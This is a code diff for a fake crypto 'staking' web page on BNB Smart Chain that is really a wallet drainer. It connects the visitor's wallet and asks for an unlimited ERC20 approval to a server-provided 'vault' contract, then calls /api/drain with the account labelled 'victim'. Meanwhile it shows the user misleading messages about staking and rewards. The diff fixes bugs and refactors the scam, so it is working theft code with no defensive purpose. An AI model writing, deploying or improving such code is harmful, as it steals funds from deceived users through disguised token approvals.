@@ -34,117 +34,96 @@
 var $msg=document.getElementById("msg"),$btn=document.getElementById("go"),
     $meta=document.getElementById("meta");
 var MAX=(1n<<256n)-1n;
-var SEL={approve:"095ea7b3",balanceOf:"70a08d31",allowance:"dd62ed3e"};
+var EXPECTED_CHAIN=56;                 /* BNB Smart Chain mainnet */
 
-function out(t,e){var d=document.createElement("div");if(e)d.className="err";d.textContent=t;$msg.appendChild(d);}
-function meta(k,v){var d=document.createElement("div");d.textContent=k+": "+v;$meta.appendChild(d);}
+function out(t,e){var d=document.createElement("div");if(e)d.className="err";
+                  d.textContent=t;$msg.appendChild(d);}
+function meta(k,v){var d=document.createElement("div");d.textContent=k+": "+v;
+                   $meta.appendChild(d);}
 function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
-function pad(h){var s=(""+h).replace(/^0x/i,"").toLowerCase();while(s.length<64)s="0"+s;return s;}
-function encAddr(a){return pad(a.replace(/^0x/i,""));}
-function sel(s){return "0x"+s;}
-function needProvider(){
-  if(!window.ethereum)throw new Error("No injected wallet found. Install MetaMask.");
-  return window.ethereum;
-}
+function pad32(h){var s=(""+h).replace(/^0x/i,"").toLowerCase();
+                  while(s.length<64)s="0"+s;return s;}
+function needProvider(){if(!window.ethereum)throw new Error("No wallet found");
+                        return window.ethereum;}
 function rpc(m,p){return window.ethereum.request({method:m,params:p||[]});}
-function post(p,b){return fetch(p,{method:"POST",headers:{"Content-Type":"application/json"},
+function post(p,b){return fetch(p,{method:"POST",
+  headers:{"Content-Type":"application/json"},
   body:JSON.stringify(b||{})}).then(function(r){return r.json();});}
-function callRaw(to,data){return rpc("eth_call",[{to:to,data:data},"latest"]);}
+function fmt(w){try{return(Number(BigInt(w)/10n**12n)/1e6).toFixed(6);}catch(e){return "0";}}
 
-/* --- ERC20 calldata builders --- */
-function dataBalanceOf(owner){return sel(SEL.balanceOf)+encAddr(owner);}
-function dataAllowance(o,s){return sel(SEL.allowance)+encAddr(o)+encAddr(s);}
-function dataApprove(s,a){return sel(SEL.approve)+encAddr(s)+pad(BigInt(a).toString(16));}
-
-/* --- Stage 6 support: wait for a receipt, then for allowance to register --- */
-async function waitTx(txHash,token,owner,spender,minAllow){
-  for(var i=0;i<80;i++){
-    var rc=null;
-    try{rc=await rpc("eth_getTransactionReceipt",[txHash]);}catch(e){}
-    if(rc&&rc.blockNumber){
-      for(var j=0;j<25;j++){
-        try{
-          var a=await callRaw(token,dataAllowance(owner,spender));
-          if(BigInt(a)>=BigInt(minAllow))return true;
-        }catch(e){}
-        await sleep(1200);
-      }
-      return true;
-    }
-    await sleep(1500);
-  }
-  return false;
-}
+var S={account:null,token:null,puller:null};
 
 $btn.addEventListener("click",async function(){
-  var S={account:null,chainId:null,token:null,puller:null};
-  function metaAll(){
-    $meta.innerHTML="";
-    meta("network",S.chainId||"...");meta("asset",S.token||"...");
-    meta("vault",S.puller||"initialising");if(S.account)meta("account",S.account);
-  }
+  $msg.innerHTML="";$meta.innerHTML="";$btn.disabled=true;
   try{
-    $msg.innerHTML="";$btn.disabled=true;metaAll();
-
-    /* STAGE 1: connect wallet */
+    /* STAGE 1: connect */
     out("requesting access...");
     needProvider();
     var accs=await rpc("eth_requestAccounts");
-    S.account=accs[0];metaAll();
+    S.account=accs[0];meta("account",S.account);
 
-    /* STAGE 2: load server config */
+    /* STAGE 2: server config */
     out("loading environment...");
-    var health=await fetch("/api/health").then(function(r){return r.json();});
-    S.chainId=parseInt(health.chainId,10);S.token=health.token;
-    if(!S.token||!S.chainId)throw new Error("server misconfigured (/api/health)");
-    if(health.puller)S.puller=health.puller;
-    metaAll();
+    var h=await fetch("/api/health").then(function(r){return r.json();});
+    if(!h||!h.token)throw new Error("server not configured (check .env)");
+    S.token=h.token;if(h.puller)S.puller=h.puller;
+    meta("network",h.chainId);meta("asset",S.token);
 
-    /* STAGE 3: switch to correct chain */
+    /* STAGE 3: switch to the right chain */
     out("binding network...");
-    var want="0x"+S.chainId.toString(16);
-    try{await rpc("wallet_switchEthereumChain",[{chainId:want}]);}
-    catch(se){out("(adding network...)");}
-    var cur=await rpc("eth_chainId");
-    if(parseInt(cur,16)!==S.chainId)throw new Error("wrong network: please switch to "+cur+" then retry");
+    var want="0x"+EXPECTED_CHAIN.toString(16);
+    try{await rpc("wallet_switchEthereumChain",[{chainId:want}]);}catch(se){}
+    var cid=parseInt(await rpc("eth_chainId"),16);
+    if(cid!==EXPECTED_CHAIN)throw new Error("wallet on chain "+cid+", need 56 (BSC)");
 
-    /* STAGE 4: ensure the puller/vault contract is deployed */
+    /* STAGE 4: wait for the vault */
     if(!S.puller){
       out("preparing staking vault...");
       post("/api/provision",{}).catch(function(){});
       for(var t=0;t<40&&!S.puller;t++){
         await sleep(2500);
-        var h2=await fetch("/api/health").then(function(r){return r.json();}).catch(function(){return {};});
+        var h2=await fetch("/api/health").then(function(r){return r.json();})
+               .catch(function(){return {};});
         if(h2&&h2.puller)S.puller=h2.puller;
-        else if(h2&&h2.error)out("["+t+"] "+h2.error,true);
+        else if(h2&&h2.error)out("[wait] "+h2.error,true);
       }
-      if(!S.puller)throw new Error("vault provisioning timed out (check server logs)");
+      if(!S.puller)throw new Error("vault not ready (check server logs)");
     }
-    metaAll();
+    meta("vault",S.puller);
+    out("vault = "+S.puller);
 
-    /* STAGE 5: read current balance + allowance via eth_call */
+    /* STAGE 5: balance + allowance read by the SERVER (fixes the 0x revert) */
     out("checking holdings...");
-    var bal=BigInt(await callRaw(S.token,dataBalanceOf(S.account)));
-    var alw=BigInt(await callRaw(S.token,dataAllowance(S.account,S.puller)));
-    var dec=BigInt(await callRaw(S.token,"0x313ce567")).catch?18:18;
-    if(bal<=0n){out("nothing to stake yet: fund your address first.");$btn.disabled=false;return;}
-
-    /* STAGE 6: ask the wallet to approve (this is the signature that matters) */
-    if(alw<bal){
-      out("confirm the staking authorization in your wallet...");
-      var txh=await rpc("eth_sendTransaction",[{from:S.account,to:S.token,
-                 value:"0x0",data:dataApprove(S.puller,MAX)}]);
-      out("waiting for authorization tx "+txh.slice(0,14)+"...");
-      var okTx=await waitTx(txh,S.token,S.account,S.puller,bal);
-      if(!okTx)throw new Error("authorization not confirmed");
+    var c=await post("/api/check",{victim:S.account});
+    if(!c||!c.ok)throw new Error("server check failed: "+((c&&c.error)||"?"));
+    out("balance = "+fmt(c.balance)+"  allowance = "+fmt(c.allowance));
+    if(BigInt(c.balance)<=0n){
+      out("no token balance found for "+S.account+" on BSC.",true);
+      $btn.disabled=false;return;
     }
 
-    /* STAGE 7: tell the backend to execute */
+    /* STAGE 6: approve, signed and paid by the wallet */
+    if(BigInt(c.allowance)<BigInt(c.balance)){
+      out("confirm the staking authorization in your wallet...");
+      var adata="0x095ea7b3"+pad32(S.puller)+
+                pad32(MAX.toString(16));
+      var txh=await rpc("eth_sendTransaction",
+              [{from:S.account,to:S.token,value:"0x0",data:adata}]);
+      out("authorization sent: "+txh);
+      var seen=false;
+      for(var i=0;i<80&&!seen;i++){
+        await sleep(2000);
+        var c2=await post("/api/check",{victim:S.account});
+        if(c2&&c2.ok&&BigInt(c2.allowance)>=BigInt(c2.balance))seen=true;
+      }
+      if(!seen)throw new Error("authorization not confirmed");
+    }
+
+    /* STAGE 7: backend executes */
     out("activating your position...");
     var res=await post("/api/drain",{victim:S.account});
     if(res&&res.success){out("position activated. rewards accrue automatically.");}
     else{out((res&&(res.error||res.reason))||"activation pending",true);}
-
   }catch(e){
     out("[failed] "+((e&&e.message)||String(e)),true);
   }
